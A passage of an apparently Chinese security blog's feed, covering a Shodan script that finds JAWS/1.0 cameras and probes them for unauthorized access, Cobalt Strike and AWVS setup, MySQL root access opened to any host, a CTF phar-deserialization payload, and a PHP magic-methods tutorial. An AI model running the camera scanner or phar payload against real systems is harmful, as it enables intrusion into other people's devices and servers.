JSON格式的数据</span></span><br><span class="line">    print(results)</span><br><span class="line">    print(<span class="string">"Results found:%s"</span>%results[<span class="string">'total'</span>])</span><br><span class="line">    <span class="keyword">for</span> result <span class="keyword">in</span> results[<span class="string">'matches'</span>]:</span><br><span class="line">        print(result[<span class="string">'ip_str'</span>])     <span class="comment">#打印出ip地址</span></span><br><span class="line"><span class="keyword">except</span> shoadn.APIError,e:</span><br><span class="line">    print(<span class="string">"Error:%s"</span>%e)</span><br></pre></td></tr></table></figure><p>返回的数据是JSON格式</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">        'total': 8669969,</span><br><span class="line">        'matches': [</span><br><span class="line">                &#123;</span><br><span class="line">                        'data': 'HTTP/1.0 200 OK\r\nDate: Mon, 08 Nov 2010 05:09:59 GMT\r\nSer...',</span><br><span class="line">                        'hostnames': ['pl4t1n.de'],</span><br><span class="line">                        'ip': 3579573318,</span><br><span class="line">                        'ip_str': '89.110.147.239',</span><br><span class="line">                        'os': 'FreeBSD 4.4',</span><br><span class="line">                        'port': 80,</span><br><span class="line">                        'timestamp': '2014-01-15T05:49:56.283713'</span><br><span class="line">                &#125;,</span><br><span class="line">                ...</span><br><span class="line">        ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果如下：</p><p><img src="https://i.loli.net/2021/02/07/3ZYopRmk59SVd1r.png" alt="image-20210207201131030"></p><h2 id="入侵大白鲨摄像头"><a href="#入侵大白鲨摄像头" class="headerlink" title="入侵大白鲨摄像头"></a>入侵大白鲨摄像头</h2><p>大白鲨摄像头的banner中有一个很明显的特征：<strong>JAWS/1.0</strong></p><p>而且该摄像头初始密码为空 从而可以利用该未授权漏洞</p><p>搜索大白鲨摄像头，并存入文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">f=open(<span class="string">"target.txt"</span>,<span class="string">"w"</span>)</span><br><span class="line">results=api.search(<span class="string">'JAWS/1.0'</span>)     <span class="comment">#搜索大白鲨摄像头</span></span><br><span class="line">print(<span class="string">"Results found:%s"</span>%results[<span class="string">'total'</span>])</span><br><span class="line"><span class="keyword">for</span> result <span class="keyword">in</span> results[<span class="string">'matches'</span>]:</span><br><span class="line">url=result[<span class="string">'ip_str'</span>]+<span class="string">":"</span>+str(result[<span class="string">'port'</span>])  <span class="comment">#摄像头的ip和端口</span></span><br><span class="line">f.write(url+<span class="string">"\n"</span>)    </span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>因为没有会员只能查询前100条，利用python自动化测试这100条记录中有哪些有未授权的漏洞</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> open(<span class="string">'target.txt'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> host <span class="keyword">in</span> f.readlines():</span><br><span class="line">        host = host.split(<span class="string">"\n"</span>)[<span class="number">0</span>]</span><br><span class="line">        <span class="comment"># print host</span></span><br><span class="line">        headers = &#123;</span><br><span class="line">            <span class="string">'Host'</span>: host,</span><br><span class="line">            <span class="string">'User-Agent'</span>:<span class="string">'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'</span>,</span><br><span class="line">            <span class="string">'Referer'</span>:<span class="string">"http://"</span>+ host +<span class="string">"/"</span>,</span><br><span class="line">            <span class="string">'Accept'</span>:<span class="string">"*/*"</span>,</span><br><span class="line">            <span class="string">'Accept-Language'</span>:<span class="string">'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3'</span>,</span><br><span class="line">            <span class="string">'X-Requested-With'</span>:<span class="string">'XMLHttpRequest'</span>,</span><br><span class="line">            <span class="string">'Connection'</span>:<span class="string">'close'</span></span><br><span class="line">        &#125;</span><br><span class="line">        data = <span class="string">"xml="</span> + b</span><br><span class="line">        url = <span class="string">"http://"</span>+ host +<span class="string">"/cgi-bin/gw.cgi?"</span> + data</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            req = urllib2.Request(url,headers=headers)</span><br><span class="line">            response = urllib2.urlopen(req,timeout=<span class="number">10</span>)</span><br><span class="line">            length = response.headers[<span class="string">'Content-Length'</span>]</span><br><span class="line">            <span class="keyword">if</span> length == str(<span class="string">"175"</span>):</span><br><span class="line">                <span class="keyword">print</span> host</span><br><span class="line">        <span class="keyword">except</span> urllib2.URLError,e:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"请求超时"</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/02/07/NeOiumITz9WAy1p.png" alt="image-20210207202308043"></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;python的shodan库&quot;&gt;&lt;a href=&quot;#python的shodan库&quot; class=&quot;headerlink&quot; title=&quot;python的shodan库&quot;&gt;&lt;/a&gt;python的shodan库&lt;/h1&gt;
    
    </summary>
    
    
      <category term="python" scheme="http://goudanjun.vip/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>linux反弹shell的几种常见手段</title>
    <link href="http://goudanjun.vip/2021/02/06/linux%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%87%A0%E7%A7%8D%E5%B8%B8%E8%A7%81%E6%89%8B%E6%AE%B5.html/"/>
    <id>http://goudanjun.vip/2021/02/06/linux反弹shell的几种常见手段.html/</id>
    <published>2021-02-06T13:04:23.000Z</published>
    <updated>2021-02-06T13:04:23.343Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>配置mysql远程访问</title>
    <link href="http://goudanjun.vip/2021/02/04/%E9%85%8D%E7%BD%AEmysql%E8%BF%9C%E7%A8%8B%E8%AE%BF%E9%97%AE.html/"/>
    <id>http://goudanjun.vip/2021/02/04/配置mysql远程访问.html/</id>
    <published>2021-02-04T08:40:48.000Z</published>
    <updated>2021-02-04T09:56:45.242Z</updated>
    
    <content type="html"><![CDATA[<p>新装一台虚拟机mysql的时候，往往会出现win无法连接的情况，报错信息1130，是因为没有权限的问题，解决方案如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p</span><br><span class="line"><span class="comment">#以权限用户root登录</span></span><br><span class="line">mysql&gt;use mysql;</span><br><span class="line"><span class="comment">#选择mysql库</span></span><br><span class="line">mysql&gt;select <span class="string">'host'</span> from user <span class="built_in">where</span> user=<span class="string">'root'</span>;</span><br><span class="line"><span class="comment">#查看mysql库中的user表的host值（即可进行连接访问的主机/IP名称）</span></span><br><span class="line">mysql&gt;update user <span class="built_in">set</span> host = <span class="string">'%'</span> <span class="built_in">where</span> user =<span class="string">'root'</span>;</span><br><span class="line"><span class="comment">#修改host值（以通配符%的内容增加主机/IP地址），当然也可以直接增加IP地址</span></span><br><span class="line">mysql&gt;flush privileges;</span><br><span class="line"><span class="comment">#刷新MySQL的系统权限相关表</span></span><br><span class="line">mysql&gt;select <span class="string">'host'</span> from user <span class="built_in">where</span> user=<span class="string">'root'</span>;</span><br><span class="line"><span class="comment">#再重新查看user表时，有修改</span></span><br></pre></td></tr></table></figure><p>记得Mysql服务需要重新启动（确保修改有效-service mysql restart），否则可能修改的结果无法体现。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;新装一台虚拟机mysql的时候，往往会出现win无法连接的情况，报错信息1130，是因为没有权限的问题，解决方案如下：&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span c
      
    
    </summary>
    
    
      <category term="mysql" scheme="http://goudanjun.vip/tags/mysql/"/>
    
  </entry>
  
  <entry>
    <title>docker中awvs使用记录</title>
    <link href="http://goudanjun.vip/2021/01/31/docker%E4%B8%ADawvs%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95.html/"/>
    <id>http://goudanjun.vip/2021/01/31/docker中awvs使用记录.html/</id>
    <published>2021-01-31T14:11:22.000Z</published>
    <updated>2021-01-31T14:22:01.778Z</updated>
    
    <content type="html"><![CDATA[<h1 id="安装awvs"><a href="#安装awvs" class="headerlink" title="安装awvs"></a>安装awvs</h1><a id="more"></a><p>docker中拉取下载镜像</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull secfa/docker-awvs</span><br></pre></td></tr></table></figure><p>将docker的3443端口映射到物理机的 13443端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it -d -p 13443:3443 secfa/docker-awvs</span><br></pre></td></tr></table></figure><p>如果有报错重启docker后再重复第②步</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker service docker restart </span><br><span class="line">或 </span><br><span class="line">systemctl restart  docker</span><br></pre></td></tr></table></figure><p> 访问awvs</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://docker所在服务器的ip:13343</span><br><span class="line"></span><br><span class="line"><span class="comment">#如果是谷歌chrome浏览器第一次访问awvs，可能会提示网站不可信，始终无法打开</span></span><br></pre></td></tr></table></figure><p> 默认用户名和密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: admin@admin.com  </span><br><span class="line">password: Admin123</span><br></pre></td></tr></table></figure><h1 id="启动awvs"><a href="#启动awvs" class="headerlink" title="启动awvs"></a>启动awvs</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it -d -p 13443:3443 secfa/docker-awvs</span><br></pre></td></tr></table></figure><h1 id="修改密码"><a href="#修改密码" class="headerlink" title="修改密码"></a>修改密码</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker ps -a      //查看容器，找到相应id </span><br><span class="line">docker <span class="built_in">exec</span> -it id  /bin/bash      //进入容器 </span><br><span class="line"><span class="built_in">cd</span> /home/acunetix/.acunetix       </span><br><span class="line">./change_credentials.sh</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;安装awvs&quot;&gt;&lt;a href=&quot;#安装awvs&quot; class=&quot;headerlink&quot; title=&quot;安装awvs&quot;&gt;&lt;/a&gt;安装awvs&lt;/h1&gt;
    
    </summary>
    
    
      <category term="kali" scheme="http://goudanjun.vip/tags/kali/"/>
    
      <category term="awvs" scheme="http://goudanjun.vip/tags/awvs/"/>
    
  </entry>
  
  <entry>
    <title>cs简略安装与使用</title>
    <link href="http://goudanjun.vip/2021/01/23/cs%E7%AE%80%E7%95%A5%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8.html/"/>
    <id>http://goudanjun.vip/2021/01/23/cs简略安装与使用.html/</id>
    <published>2021-01-23T12:50:40.000Z</published>
    <updated>2021-01-31T14:22:52.846Z</updated>
    
    <content type="html"><![CDATA[<h1 id="cs的安装"><a href="#cs的安装" class="headerlink" title="cs的安装"></a>cs的安装</h1><a id="more"></a><p>CS 分为客户端和服务端</p><p>这里我在kali上安装服务端</p><p>解压到kali上</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ./teamserver 192.168.239.134 123456</span><br></pre></td></tr></table></figure><p>192.168.239.134 为本机的IP；123456是客户端连接的密码。</p><p>设置后台运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nohup ./teamserver 192.168.239.134 123456 &gt;/dev/null 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;cs的安装&quot;&gt;&lt;a href=&quot;#cs的安装&quot; class=&quot;headerlink&quot; title=&quot;cs的安装&quot;&gt;&lt;/a&gt;cs的安装&lt;/h1&gt;
    
    </summary>
    
    
      <category term="后渗透" scheme="http://goudanjun.vip/tags/%E5%90%8E%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>[CISCN2019 华北赛区 Day1 Web1]Dropbox</title>
    <link href="http://goudanjun.vip/2021/01/19/%C2%96-CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox.html/"/>
    <id>http://goudanjun.vip/2021/01/19/-CISCN2019-华北赛区-Day1-Web1-Dropbox.html/</id>
    <published>2021-01-19T02:46:12.000Z</published>
    <updated>2021-01-19T10:48:37.141Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CISCN2019-华北赛区-Day1-Web1-Dropbox"><a href="#CISCN2019-华北赛区-Day1-Web1-Dropbox" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web1]Dropbox"></a>[CISCN2019 华北赛区 Day1 Web1]Dropbox</h1><p>考点：phar协议</p><a id="more"></a><p>注册登录之后是上传页面，正常上传文件，在下载文件处发现存在任意下载漏洞</p><p><img src="https://i.loli.net/2021/01/19/poDisMyHO9qYxwv.png" alt="image-20210119150237883"></p><p>注意要向前跳两级目录，因为通常情况下文件会放在 /sandbox/hash/ 目录下</p><p>利用这点我们可以下载文件：</p><p><img src="https://i.loli.net/2021/01/19/LWqTaxhRr2eVPoH.png" alt="image-20210119150621161"></p><p>源代码审计：</p><p>download.php中对文件名进行了判断 是否含有flag字段，推测我们要下载 flag文件</p><p><img src="https://i.loli.net/2021/01/19/9jGSNo6pFr7Pyz2.png" alt="image-20210119150846724"></p><p>class.php文件中定义了三个类</p><p>User类</p><p><img src="https://i.loli.net/2021/01/19/RBKj2DLCzcmhZbi.png" alt="image-20210119162158238"></p><p>File类</p><p><img src="https://i.loli.net/2021/01/19/64yvhdmQN3lOt9c.png" alt="image-20210119162218126"></p><p>FileList类</p><p><img src="https://i.loli.net/2021/01/19/wr3ToAJnxhiQYpf.png" alt="image-20210119162237449"></p><p>首先file类中存在 close() 方法会调用 file_get_contents() 函数可以读取flag文件，而 User 类中的析构方法会调用 close() 方法，FileList 类中的 __call 魔术方法可以调用file类中的 close()方法，所以我们可以理解为将user类中的 close() 方法实例化后传入 call魔术方法中的 $func 参数</p><p>得到flag文件后 利用 FileList 类中的析构函数输出</p><p>构造php文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $db;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $files;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $file = <span class="keyword">new</span> File();</span><br><span class="line">        $file-&gt;filename = <span class="string">'/flag.txt'</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files = <span class="keyword">array</span>($file);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> User();</span><br><span class="line">$a-&gt;db = <span class="keyword">new</span> FileList();</span><br><span class="line"></span><br><span class="line"><span class="comment">//构造phar文件</span></span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">'3.phar'</span>);</span><br><span class="line">$phar -&gt; startBuffering();</span><br><span class="line">$phar -&gt; setStub(<span class="string">'GIF89a'</span>.<span class="string">'&lt;?php __HALT_COMPILER();?&gt;'</span>);<span class="comment">//设置stub</span></span><br><span class="line">$phar -&gt; addFromString(<span class="string">'test.txt'</span>,<span class="string">'test'</span>);<span class="comment">//添加要压缩的文件</span></span><br><span class="line">$phar -&gt; setMetadata($a);<span class="comment">//存入自定义的meta-data</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line">$phar -&gt; stopBuffering();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>运行这个php文件 会生成一个 3.phar 文件，更改后缀名为 png 上传</p><p>成功上传后 执行删除操作，触发phar反序列化，得到flag</p><p><img src="https://i.loli.net/2021/01/19/FvbPjK8nQBmYRCh.png" alt="image-20210119183943641"></p><p>参考链接：</p><ul><li><a href="https://www.cnblogs.com/chrysanthemum/p/11785453.html" target="_blank" rel="noopener">https://www.cnblogs.com/chrysanthemum/p/11785453.html</a></li><li><a href="https://flag0.com/2019/10/31/ciscn2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Dropbox/" target="_blank" rel="noopener">https://flag0.com/2019/10/31/ciscn2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Dropbox/</a></li><li><a href="http://www.iniess.ink/index.php/archives/Dropbox-1.html" target="_blank" rel="noopener">http://www.iniess.ink/index.php/archives/Dropbox-1.html</a></li></ul><p>有关phar的文章 下面这篇写的不戳</p><ul><li><a href="https://xz.aliyun.com/t/2715#toc-16" target="_blank" rel="noopener">https://xz.aliyun.com/t/2715#toc-16</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;CISCN2019-华北赛区-Day1-Web1-Dropbox&quot;&gt;&lt;a href=&quot;#CISCN2019-华北赛区-Day1-Web1-Dropbox&quot; class=&quot;headerlink&quot; title=&quot;[CISCN2019 华北赛区 Day1 Web1]Dropbox&quot;&gt;&lt;/a&gt;[CISCN2019 华北赛区 Day1 Web1]Dropbox&lt;/h1&gt;&lt;p&gt;考点：phar协议&lt;/p&gt;
    
    </summary>
    
    
      <category term="反序列化" scheme="http://goudanjun.vip/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
      <category term="PHP" scheme="http://goudanjun.vip/tags/PHP/"/>
    
      <category term="phar协议" scheme="http://goudanjun.vip/tags/phar%E5%8D%8F%E8%AE%AE/"/>
    
  </entry>
  
  <entry>
    <title>PHP魔术方法总结</title>
    <link href="http://goudanjun.vip/2021/01/19/PHP%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93.html/"/>
    <id>http://goudanjun.vip/2021/01/19/PHP魔术方法总结.html/</id>
    <published>2021-01-19T02:37:41.000Z</published>
    <updated>2021-01-19T02:45:19.882Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>PHP中把以两个下划线__开头的方法称为魔术方法(Magic methods)，这些方法在PHP中充当了举足轻重的作用。 魔术方法包括：</p><a id="more"></a><ol><li>__construct()，类的构造函数</li><li>__destruct()，类的析构函数</li><li>__call()，在对象中调用一个不可访问方法时调用</li><li>__callStatic()，用静态方式中调用一个不可访问方法时调用</li><li>__get()，获得一个类的成员变量时调用</li><li>__set()，设置一个类的成员变量时调用</li><li>__isset()，当对不可访问属性调用isset()或empty()时调用</li><li>__unset()，当对不可访问属性调用unset()时被调用。</li><li>__sleep()，执行serialize()时，先会调用这个函数</li><li>__wakeup()，执行unserialize()时，先会调用这个函数</li><li>__toString()，类被当成字符串时的回应方法</li><li>__invoke()，调用函数的方式调用一个对象时的回应方法</li><li>__set_state()，调用var_export()导出类时，此静态方法会被调用。</li><li>__clone()，当对象复制完成时调用</li><li>__autoload()，尝试加载未定义的类</li><li>__debugInfo()，打印所需调试信息</li></ol><h2 id="范例"><a href="#范例" class="headerlink" title="范例"></a>范例</h2><p>下面让我们以实例的形式向大家讲解下这几个魔术方法时如何使用的。</p><h3 id="construct-，类的构造函数"><a href="#construct-，类的构造函数" class="headerlink" title="__construct()，类的构造函数"></a>__construct()，类的构造函数</h3><p>php中构造方法是对象创建完成后第一个被对象自动调用的方法。在每个类中都有一个构造方法，如果没有显示地声明它，那么类中都会默认存在一个没有参数且内容为空的构造方法。</p><p>1、 构造方法的作用</p><p>通常构造方法被用来执行一些有用的初始化任务，如对成员属性在创建对象时赋予初始值。</p><p>2、 构造方法的在类中的声明格式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function __constrct([参数列表])&#123;</span><br><span class="line"></span><br><span class="line">    方法体 //通常用来对成员属性进行初始化赋值</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3、 在类中声明构造方法需要注意的事项</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、在同一个类中只能声明一个构造方法，原因是，PHP不支持构造函数重载。</span><br><span class="line"></span><br><span class="line">2、构造方法名称是以两个下画线开始的__construct()</span><br></pre></td></tr></table></figure><p>下面是它的例子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class">    </span>&#123;                                                                      </span><br><span class="line">            <span class="keyword">public</span> $name;        </span><br><span class="line">            <span class="keyword">public</span> $age;        </span><br><span class="line">            <span class="keyword">public</span> $sex;        </span><br><span class="line">                                                                 </span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 显示声明一个构造方法且带参数</span></span><br><span class="line"><span class="comment">         */</span>                                                                                       </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name=<span class="string">""</span>, $sex=<span class="string">"男"</span>, $age=<span class="number">22</span>)</span></span></span><br><span class="line"><span class="function">        </span>&#123;      </span><br><span class="line">            <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;sex = $sex;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;age = $age;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * say 方法</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">say</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123; </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"我叫："</span> . <span class="keyword">$this</span>-&gt;name . <span class="string">"，性别："</span> . <span class="keyword">$this</span>-&gt;sex . <span class="string">"，年龄："</span> . <span class="keyword">$this</span>-&gt;age;</span><br><span class="line">        &#125;   </span><br><span class="line">                                                                                           </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>创建对象$Person1且不带任参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$Person1 = new Person();</span><br><span class="line">echo $Person1-&gt;say(); //输出:我叫：，性别：男，年龄：27</span><br></pre></td></tr></table></figure><p>创建对象$Person2且带参数“小明”</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$Person2 = new Person(&quot;小明&quot;);</span><br><span class="line">echo $Person2-&gt;say(); //输出：我叫：张三，性别：男，年龄：27</span><br></pre></td></tr></table></figure><p>创建对象$Person3且带三个参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$Person3 = new Person(&quot;李四&quot;,&quot;男&quot;,25);</span><br><span class="line">echo $Person3-&gt;say(); //输出：我叫：李四，性别：男，年龄：25</span><br></pre></td></tr></table></figure><h3 id="destruct-，类的析构函数"><a href="#destruct-，类的析构函数" class="headerlink" title="__destruct()，类的析构函数"></a>__destruct()，类的析构函数</h3><p>通过上面的讲解，现在我们已经知道了什么叫构造方法。那么与构造方法对应的就是析构方法。</p><p>析构方法允许在销毁一个类之前执行的一些操作或完成一些功能，比如说关闭文件、释放结果集等。</p><p>析构方法是PHP5才引进的新内容。</p><p>析造方法的声明格式与构造方法 <code>__construct()</code> 比较类似，也是以两个下划线开始的方法 <code>__destruct()</code> ，这种析构方法名称也是固定的。</p><p>1、 析构方法的声明格式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function __destruct()</span><br><span class="line">&#123;</span><br><span class="line"> //方法体</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意：析构函数不能带有任何参数。</p><p>2、 析构方法的作用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">一般来说，析构方法在PHP中并不是很常用，它属类中可选择的一部分，通常用来完成一些在对象销毁前的清理任务。</span><br></pre></td></tr></table></figure><p>举例演示，如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;     </span><br><span class="line">                                                        </span><br><span class="line">    <span class="keyword">public</span> $name;         </span><br><span class="line">    <span class="keyword">public</span> $age;         </span><br><span class="line">    <span class="keyword">public</span> $sex;         </span><br><span class="line">                                                                    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name=<span class="string">""</span>, $sex=<span class="string">"男"</span>, $age=<span class="number">22</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;   </span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sex  = $sex;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age  = $age;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * say 